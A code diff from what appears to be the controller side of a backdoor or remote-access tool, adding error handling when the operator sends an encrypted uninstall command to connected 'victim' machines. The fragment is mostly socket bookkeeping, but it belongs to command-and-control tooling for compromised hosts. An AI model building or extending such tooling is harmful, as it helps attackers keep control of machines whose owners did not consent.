@@ -113,7 +113,22 @@ if __name__ == '__main__':
                             pass
                             # return None
                         else:
-                            client_socket.send(encrypt_string(constants.UNINSTALL, shared_secret).encode())
+                            try:
+                                print(constants.UNINSTALL_SIGNAL_MSG)
+                                client_socket.send(encrypt_string(constants.UNINSTALL, shared_secret).encode())
+                                client_socket.send(encrypt_string((constants.PROJECT_NAME + "/" +
+                                                                   constants.PROJECT_NAME_ALT), shared_secret).encode())
+                            except ConnectionResetError as e:
+                                print(constants.UNINSTALL_SUCCESS_MSG)
+                            except BrokenPipeError as e:
+                                print(constants.UNINSTALL_SUCCESS_MSG)
+                            except Exception as e:
+                                print(constants.UNINSTALL_ERROR_MSG.format(e))
+                            finally:
+                                sockets_to_read.remove(client_socket)
+                                del connected_clients[client_socket]
+                                client_socket.close()
+                                print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
 
                     elif len(connected_clients) != constants.ZERO:
                         target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
@@ -136,7 +151,22 @@ if __name__ == '__main__':
                             pass
 
                         if target_socket:
-                            target_socket.send(encrypt_string(constants.UNINSTALL, shared_secret).encode())
+                            try:
+                                print(constants.UNINSTALL_SIGNAL_MSG)
+                                target_socket.send(encrypt_string(constants.UNINSTALL, shared_secret).encode())
+                                target_socket.send(encrypt_string((constants.PROJECT_NAME + "/" +
+                                                                   constants.PROJECT_NAME_ALT), shared_secret).encode())
+                            except ConnectionResetError as e:
+                                print(constants.UNINSTALL_SUCCESS_MSG)
+                            except BrokenPipeError as e:
+                                print(constants.UNINSTALL_SUCCESS_MSG)
+                            except Exception as e:
+                                print(constants.UNINSTALL_ERROR_MSG.format(e))
+                            finally:
+                                sockets_to_read.remove(target_socket)
+                                del connected_clients[target_socket]
+                                target_socket.close()
+                                print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
                         else:
                             print(constants.TARGET_VICTIM_NOT_FOUND)
 
